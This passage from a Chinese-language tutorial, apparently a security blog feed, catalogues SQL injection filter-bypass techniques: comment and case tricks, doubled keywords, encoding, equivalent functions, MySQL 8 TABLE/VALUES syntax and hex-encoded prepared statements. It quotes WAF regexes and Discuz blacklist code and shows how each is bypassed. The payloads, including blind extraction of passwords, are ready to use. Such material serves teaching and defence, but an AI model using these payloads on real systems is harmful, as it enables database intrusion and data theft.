<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">64</span>
</code></pre></td></tr></table>
</div>
</div><p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,&hellip;)函数返回输入参数(n1,n2,n3,&hellip;)的最大值</p>
<p>那么上面的这条sql语句可以使用greatest变为如下的子句:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="n">greatest</span><span class="p">(</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">)),</span><span class="mi">64</span><span class="p">)</span><span class="o">=</span><span class="mi">64</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="使用between-and绕过">使用**<code>between</code> <code>and</code>**绕过</h3>
<p>between a and b：返回a，b之间的数据，不包含b。</p>
<h2 id="过滤等号--">过滤等号（ <code>=</code> ）</h2>
<h3 id="使用like-rlike-regexp-或者-使用-或者-">使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;</h3>
<h2 id="过滤or-and-xor-not">过滤<code>or</code> <code>and</code> <code>xor</code> <code>not</code></h2>
<h3 id="使用符号代替">使用符号代替</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">and</span><span class="o">=`&amp;&amp;`</span>  <span class="k">or</span><span class="o">=`||`</span>   <span class="n">xor</span><span class="o">=`|`</span>   <span class="k">not</span><span class="o">=`!`</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="过滤unionselectwhere等">过滤<code>union</code>，<code>select</code>，<code>where</code>等</h2>
<h3 id="使用注释符绕过-1">使用<strong>注释符</strong>绕过</h3>
<p>常用注释符：</p>
<p><code>//</code>、<code>--</code>、<code>/**/</code>、<code>#</code>、<code>--+</code>、<code>---</code>、<code>;</code>、<code>%00</code>、<code>--a</code></p>
<p>用法：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">U</span><span class="cm">/**/</span> <span class="n">NION</span> <span class="cm">/**/</span> <span class="n">SE</span><span class="cm">/**/</span> <span class="n">LECT</span> <span class="cm">/**/</span><span class="k">user</span><span class="err">，</span><span class="n">pwd</span> <span class="k">from</span> <span class="k">user</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="使用大小写绕过">使用<strong>大小写</strong>绕过</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39;UnIoN/**/SeLeCT
</span></code></pre></td></tr></table>
</div>
</div><h3 id="使用内联注释绕过">使用<strong>内联注释</strong>绕过</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#
</span></code></pre></td></tr></table>
</div>
</div><h3 id="使用双关键字绕过若删除掉第一个匹配的union就能绕过">使用<strong>双关键字</strong>绕过（若删除掉第一个匹配的union就能绕过）</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39;UNIunionONSeLselectECT1,2,3–-
</span></code></pre></td></tr></table>
</div>
</div><h3 id="使用加号拆解字符串">使用<strong>加号+拆解字符串</strong></h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">or</span> <span class="err">‘</span><span class="n">swords</span><span class="err">’</span> <span class="o">=</span><span class="err">‘</span><span class="n">sw</span><span class="err">’</span> <span class="o">+</span><span class="err">’</span> <span class="n">ords</span><span class="err">’</span> <span class="err">；</span><span class="k">EXEC</span><span class="p">(</span><span class="err">‘</span><span class="k">IN</span><span class="err">’</span> <span class="o">+</span><span class="err">’</span> <span class="n">SERT</span> <span class="k">INTO</span> <span class="err">‘</span><span class="o">+</span><span class="err">’</span> <span class="err">…</span><span class="p">..</span><span class="err">’</span> <span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="使用语法新特性绕过屏蔽select">使用语法新特性绕过屏蔽select</h3>
<p>在MySQL 8.0.19版本后，mysql推出了一些新特性，使我们可以不使用select就能够取数据</p>
<h4 id="table-语句">TABLE 语句</h4>
<p>可以直接列出表的全部内容</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">TABLE</span> <span class="k">table_name</span> <span class="p">[</span><span class="k">ORDER</span> <span class="k">BY</span> <span class="k">column_name</span><span class="p">]</span> <span class="p">[</span><span class="k">LIMIT</span> <span class="nb">number</span> <span class="p">[</span><span class="k">OFFSET</span> <span class="nb">number</span><span class="p">]]</span>
</code></pre></td></tr></table>
</div>
</div><p>如 <code>select * from user</code> 就可以用 <code>table user</code> 替代来进行绕过</p>
<h4 id="values-语句">VALUES 语句</h4>
<p>可以列出一行的值</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">VALUES</span> <span class="n">row_constructor_list</span> <span class="p">[</span><span class="k">ORDER</span> <span class="k">BY</span> <span class="n">column_designator</span><span class="p">]</span> <span class="p">[</span><span class="k">LIMIT</span> <span class="k">BY</span> <span class="nb">number</span><span class="p">]</span>

<span class="n">row_constructor_list</span><span class="p">:</span>
 <span class="k">ROW</span><span class="p">(</span><span class="n">value_list</span><span class="p">)[,</span> <span class="k">ROW</span><span class="p">(</span><span class="n">value_list</span><span class="p">)][,</span> <span class="p">...]</span>

<span class="n">value_list</span><span class="p">:</span>
 <span class="n">value</span><span class="p">[,</span> <span class="n">value</span><span class="p">][,</span> <span class="p">...]</span>

<span class="n">column_designator</span><span class="p">:</span>
 <span class="n">column_index</span>
</code></pre></td></tr></table>
</div>
</div><p>例如直接列出一行的值</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">VALUES</span> <span class="k">ROW</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">),</span> <span class="k">ROW</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><blockquote>
<p>VALUES和TABLES语句的结果都是表数据，可以结合起来使用</p>
</blockquote>
<h2 id="使用编码绕过过滤">使用<strong>编码</strong>绕过过滤</h2>
<p>如<code>URLEncode</code>编码，<code>ASCII</code>,<code>HEX</code>,<code>unicode</code>编码绕过</p>
<p><code>or 1=1</code>即<code>%6f%72%20%31%3d%31</code>，而<code>Test</code>也可以为<code>CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</code></p>
<h2 id="使用等价函数绕过过滤">使用<strong>等价函数</strong>绕过过滤</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">hex</span><span class="p">()</span><span class="err">、</span><span class="n">bin</span><span class="p">()</span> <span class="o">==&gt;</span> <span class="n">ascii</span><span class="p">()</span>

<span class="n">sleep</span><span class="p">()</span> <span class="o">==&gt;</span><span class="n">benchmark</span><span class="p">()</span>

<span class="n">concat_ws</span><span class="p">()</span><span class="o">==&gt;</span><span class="n">group_concat</span><span class="p">()</span>

<span class="n">mid</span><span class="p">()</span><span class="err">、</span><span class="n">substr</span><span class="p">()</span> <span class="o">==&gt;</span> <span class="k">substring</span><span class="p">()</span>

<span class="o">@@</span><span class="k">user</span> <span class="o">==&gt;</span> <span class="k">user</span><span class="p">()</span>

<span class="o">@@</span><span class="n">datadir</span> <span class="o">==&gt;</span> <span class="n">datadir</span><span class="p">()</span>

<span class="err">举例：</span><span class="k">substring</span><span class="p">()</span><span class="err">和</span><span class="n">substr</span><span class="p">()</span><span class="err">无法使用时：</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="o">+</span><span class="k">and</span><span class="o">+</span><span class="n">ascii</span><span class="p">(</span><span class="k">lower</span><span class="p">(</span><span class="n">mid</span><span class="p">((</span><span class="k">select</span><span class="o">+</span><span class="n">pwd</span><span class="o">+</span><span class="k">from</span><span class="o">+</span><span class="n">users</span><span class="o">+</span><span class="k">limit</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">=</span><span class="mi">74</span>　

<span class="err">或者：</span>
<span class="n">substr</span><span class="p">((</span><span class="k">select</span> <span class="s1">&#39;password&#39;</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="n">x70</span>
<span class="n">strcmp</span><span class="p">(</span><span class="k">left</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span> <span class="mi">0</span><span class="n">x69</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">strcmp</span><span class="p">(</span><span class="k">left</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span> <span class="mi">0</span><span class="n">x70</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">strcmp</span><span class="p">(</span><span class="k">left</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span> <span class="mi">0</span><span class="n">x71</span><span class="p">)</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="补充进行过滤的几种思路">补充：进行过滤的几种思路</h2>
<h3 id="黑名单字符替换">黑名单字符替换</h3>
<p>这种是最简单的，针对某些黑名单关键字，直接进行 str_replace</p>
<p>如果替换的不完全，可以用 <code>selselectect</code> 来替换 <code>select</code> 绕过</p>
<h3 id="正则匹配">正则匹配</h3>
<p>在一些waf或者cms会见到类似如下的防护代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$filter</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&lt;.+javascript:window</span><span class="se">\\</span><span class="s2">[.{1}</span><span class="se">\\\\</span><span class="s2">x|&lt;.*=(&amp;#</span><span class="se">\\</span><span class="s2">d+?;?)+?&gt;|&lt;.*(data|src)=data:text</span><span class="se">\\</span><span class="s2">/html.*&gt;|</span><span class="se">\\</span><span class="s2">b(alert</span><span class="se">\\</span><span class="s2">(|confi
</span><span class="s2">rm</span><span class="se">\\</span><span class="s2">(|expression</span><span class="se">\\</span><span class="s2">(|prompt</span><span class="se">\\</span><span class="s2">(|benchmark\s*?\(.*\)|sleep\s*?\(.*\)|load_file\s*?</span><span class="se">\\</span><span class="s2">()|&lt;[a-z]+?</span><span class="se">\\</span><span class="s2">b[^&gt;]*?</span><span class="se">\\</span><span class="s2">bon([a-z]{4,})
</span><span class="s2">\s*?=|^</span><span class="se">\\</span><span class="s2">+</span><span class="se">\\</span><span class="s2">/v(8|9)|</span><span class="se">\\</span><span class="s2">b(and|or)</span><span class="se">\\</span><span class="s2">b</span><span class="se">\\</span><span class="s2">s*?([</span><span class="se">\\</span><span class="s2">(</span><span class="se">\\</span><span class="s2">)&#39;</span><span class="se">\&#34;\\</span><span class="s2">d]+?=[</span><span class="se">\\</span><span class="s2">(</span><span class="se">\\</span><span class="s2">)&#39;</span><span class="se">\&#34;\\</span><span class="s2">d]+?|[</span><span class="se">\\</span><span class="s2">(</span><span class="se">\\</span><span class="s2">)&#39;</span><span class="se">\&#34;</span><span class="s2">a-zA-Z]+?=[</span><span class="se">\\</span><span class="s2">(</span><span class="se">\\</span><span class="s2">)&#39;</span><span class="se">\&#34;</span><span class="s2">a-zA-Z]+?|&gt;|&lt;
</span><span class="s2">|\s+?[</span><span class="se">\\</span><span class="s2">w]+?</span><span class="se">\\</span><span class="s2">s+?</span><span class="se">\\</span><span class="s2">bin</span><span class="se">\\</span><span class="s2">b</span><span class="se">\\</span><span class="s2">s*?\(|</span><span class="se">\\</span><span class="s2">blike</span><span class="se">\\</span><span class="s2">b</span><span class="se">\\</span><span class="s2">s+?[</span><span class="se">\&#34;</span><span class="s2">&#39;])|</span><span class="se">\\</span><span class="s2">/</span><span class="se">\\</span><span class="s2">*.*</span><span class="se">\\</span><span class="s2">*</span><span class="se">\\</span><span class="s2">/|&lt;</span><span class="se">\\</span><span class="s2">s*script</span><span class="se">\\</span><span class="s2">b|</span><span class="se">\\</span><span class="s2">bEXEC</span><span class="se">\\</span><span class="s2">b|UNION.+?SELECT(\(|@{1
</span><span class="s2">,2}\w+?\s*|\s+?.+?|.*(`|&#39;|</span><span class="se">\&#34;</span><span class="s2">).+(`|&#39;|</span><span class="se">\&#34;</span><span class="s2">)\s*)|UPDATE\s*(\(.+\)\s*|@{1,2}.+?\s*|\s+?.+?|(`|&#39;|</span><span class="se">\&#34;</span><span class="s2">).*?(`|&#39;|</span><span class="se">\&#34;</span><span class="s2">)\s*)SET|INSER
</span><span class="s2">T</span><span class="se">\\</span><span class="s2">s+INTO.+?VALUES|(SELECT|DELETE).+?FROM\s+?|(CREATE|ALTER|DROP|TRUNCATE)</span><span class="se">\\</span><span class="s2">s+(TABLE|DATABASE)|FROM\s.?|\(select|\(\s
</span><span class="s2">select|\bunion\b|select\s.+?&#34;</span><span class="p">;</span>
</code></pre></td></tr></table>
</div>
</div><p>这里面匹配了各种模式的注入语句，但是还是可以绕过的</p>
<p>比如说 <code>INSERT\\s+INTO.+?VALUES</code> 可以使用 <code>insert into xxx select</code> 的方式进行绕过</p>
<p>在经过不断的更新换代升级之后，产生了一些非常经典的正则，主要考虑到注入获取数据的时候需要联合查询或者子查询来完成</p>
<p>例如discuz的防护代码 <code>_do_query_safe</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$_config</span><span class="p">[</span><span class="s1">&#39;security&#39;</span><span class="p">][</span><span class="s1">&#39;querysafe&#39;</span><span class="p">][</span><span class="s1">&#39;dfunction&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;load_file&#39;</span><span class="p">,</span><span class="s1">&#39;hex&#39;</span><span class="p">,</span><span class="s1">&#39;substring&#39;</span><span class="p">,</span><span class="s1">&#39;if&#39;</span><span class="p">,</span><span class="s1">&#39;ord&#39;</span><span class="p">,</span><span class="s1">&#39;char&#39;</span><span class="p">);</span>
<span class="nv">$_config</span><span class="p">[</span><span class="s1">&#39;security&#39;</span><span class="p">][</span><span class="s1">&#39;querysafe&#39;</span><span class="p">][</span><span class="s1">&#39;daction&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;@&#39;</span><span class="p">,</span><span class="s1">&#39;intooutfile&#39;</span><span class="p">,</span><span class="s1">&#39;intodumpfile&#39;</span><span class="p">,</span><span class="s1">&#39;unionselect&#39;</span><span class="p">,</span><span class="s1">&#39;(select&#39;</span><span class="p">,</span> <span class="s1">&#39;un
</span><span class="s1">ionall&#39;</span><span class="p">,</span> <span class="s1">&#39;uniondistinct&#39;</span><span class="p">);</span>
<span class="nv">$_config</span><span class="p">[</span><span class="s1">&#39;security&#39;</span><span class="p">][</span><span class="s1">&#39;querysafe&#39;</span><span class="p">][</span><span class="s1">&#39;dnote&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;/*&#39;</span><span class="p">,</span><span class="s1">&#39;*/&#39;</span><span class="p">,</span><span class="s1">&#39;#&#39;</span><span class="p">,</span><span class="s1">&#39;--&#39;</span><span class="p">,</span><span class="s1">&#39;&#34;&#39;</span><span class="p">);</span>
<span class="o">...</span>
<span class="nv">$clean</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s2">&#34;/[^a-z0-9_\-\(\)#\*\/</span><span class="se">\&#34;</span><span class="s2">]+/is&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nv">$clean</span><span class="p">));</span>
<span class="o">...</span>
<span class="k">if</span> <span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nx">self</span><span class="o">::</span><span class="nv">$config</span><span class="p">[</span><span class="s1">&#39;dfunction&#39;</span><span class="p">]))</span> <span class="p">{</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nx">self</span><span class="o">::</span><span class="nv">$config</span><span class="p">[</span><span class="s1">&#39;dfunction&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$fun</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$clean</span><span class="p">,</span> <span class="nv">$fun</span> <span class="o">.</span> <span class="s1">&#39;(&#39;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span>
            <span class="k">return</span> <span class="s1">&#39;-1&#39;</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>这段代码首先将sql语句除了<code>a-z``0-9</code>和几个有限的字符外的其他所有字符替换为空，然后对其进行匹配，如果能够匹配到类似<code>unionall</code>、<code>(select</code>这样的获取数据所要用到的代码，就拒绝执行</p>
<p>但是即便是这样也还可以绕过，比如同表注入就不需要用到子查询</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test</span> <span class="k">where</span> <span class="n">test3</span><span class="o">=-</span><span class="mi">1</span> <span class="k">or</span> <span class="n">substr</span><span class="p">(</span><span class="n">test2</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="mi">1</span>
</code></pre></td></tr></table>
</div>
</div><p>或者可以使用多语句的方式执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">set</span> <span class="o">@</span><span class="n">a</span><span class="p">:</span><span class="o">=</span><span class="mi">0</span><span class="n">x73656c656374202a2066726f6d2074657374</span><span class="p">;</span>
<span class="k">prepare</span> <span class="n">s</span> <span class="k">from</span> <span class="o">@</span><span class="n">a</span><span class="p">;</span>
<span class="k">execute</span> <span class="n">s</span><span class="p">;</span>
</code></pre></td></tr></table>
</div>
</div><p>也可以</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">handler</span> <span class="k">user</span> <span class="k">open</span><span class="p">;</span>
<span class="k">handler</span> <span class="k">user</span> <span class="k">read</span> <span class="k">first</span><span class="p">;</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="语义分析">语义分析</h3>
<p>这是最高级的方式，模仿mysql对sql的分析，waf对用户的输入进行语法语义分析，如果符合mysql的语法，就判断为sql注入从而阻断</p>
<p>这种防护的绕过思路就是找特殊的语法，这些特殊语法waf可能没有覆盖全面，从而导致waf语义分析失败，从而进行绕过</p>
<p>例如我们上面说的mysql8的tables和values语句就是比较新的语法，有很多waf还米有覆盖到</p>]]></description></item></channel></rss>